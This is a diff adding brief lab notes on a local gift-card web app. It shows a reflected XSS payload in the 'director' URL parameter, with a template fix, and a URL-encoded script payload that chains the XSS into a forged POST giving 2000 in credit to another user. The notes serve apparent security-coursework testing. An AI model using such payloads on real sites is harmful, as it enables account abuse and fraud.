@@ -1,0 +1,11 @@
+Xss Attack
+
+http://127.0.0.1:8000/gift/0?director=%3Cscript%3Ealert(1)%3C/script%3E
+
+FIX - Change {{director|safe}} to {{director}} in all html templates
+
+
+Force User to gift Card
+- CSRF attack
+  - Build on XSS vulnerability above 
+http://127.0.0.1:8000/gift/1?director=%3Cscript%3E%0Avar%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0Axhttp.open%28%22POST%22%2C%20%22%2Fgift%2F3%22%2C%20true%29%3B%0Axhttp.setRequestHeader%28%22Content-type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Axhttp.send%28%22amount%3D2000%26username%3Dtest2%22%29%3B%20%0A%3C%2Fscript%3E
